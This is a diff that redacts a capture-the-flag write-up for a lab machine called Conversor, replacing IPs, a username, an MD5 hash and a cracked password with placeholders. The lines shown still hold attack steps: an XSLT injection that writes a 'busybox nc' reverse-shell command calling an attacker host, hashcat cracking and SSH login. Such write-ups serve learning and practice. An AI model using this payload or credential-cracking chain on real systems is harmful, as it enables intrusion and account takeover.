@@ -5,7 +5,6 @@
 **Machine:** Conversor  
 **Difficulty:** Easy  
 **OS:** Linux  
-**IP:** 10.10.11.92  
 **Date:** 2025-10-31  
 **Tags:** XSLT Injection, File Upload, Cron Jobs, Privilege Escalation, Weak Password Hashing
 
@@ -41,7 +40,7 @@ Web enumeration → Source code disclosure → XSLT injection → Cron-executed 
 Comprehensive nmap scan to identify open services:
 
 ```bash
-nmap -sC -sV -p- --min-rate=5000 -T5 10.10.11.92 -oN nmap_scan.txt
+nmap -sC -sV -p- --min-rate=5000 -T5 <TARGET_IP> -oN nmap_scan.txt
 ```
 
 **Results:**
@@ -59,7 +58,7 @@ nmap -sC -sV -p- --min-rate=5000 -T5 10.10.11.92 -oN nmap_scan.txt
 ### Hostname Configuration
 
 ```bash
-echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts
+echo "<TARGET_IP> conversor.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -179,7 +178,7 @@ uid=33(www-data) gid=33(www-data)
 Write reverse shell command via XSLT:
 
 ```xml
-<exsl:document href="/var/www/conversor.htb/static/cmd.txt" method="text"><![CDATA[busybox nc 10.10.14.114 443 -e bash]]></exsl:document>
+<exsl:document href="/var/www/conversor.htb/static/cmd.txt" method="text"><![CDATA[busybox nc <ATTACKER_IP> 443 -e bash]]></exsl:document>
 ```
 
 Start netcat listener:
@@ -213,31 +212,31 @@ strings /var/www/conversor.htb/instance/users.db
 **Discovered Credentials:**
 
 ```
-fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
+[USERNAME]:[REDACTED_HASH]
 ```
 
 **Analysis:**
-- Username: `fismathack`
-- Hash: `5b5c3ac3a1c897c94caad48e6c71fdec` (appears to be MD5)
+- Username: `[USERNAME]` (redacted)
+- Hash: `[REDACTED_HASH]` (appears to be MD5)
 
 ### Password Cracking
 
 Cracked the MD5 hash using hashcat:
 
 ```bash
-echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
+echo "[REDACTED_HASH]" > hash.txt
 hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-**Result:** `Keepmesafeandwarm`
+**Result:** `[REDACTED_PASSWORD]`
 
 ### SSH Access
 
 Authenticated via SSH using discovered credentials:
 
 ```bash
-ssh fismathack@10.10.11.92
-# Password: Keepmesafeandwarm
+ssh [USERNAME]@<TARGET_IP>
+# Password: [REDACTED_PASSWORD]
 ```
 
 **User Flag:**
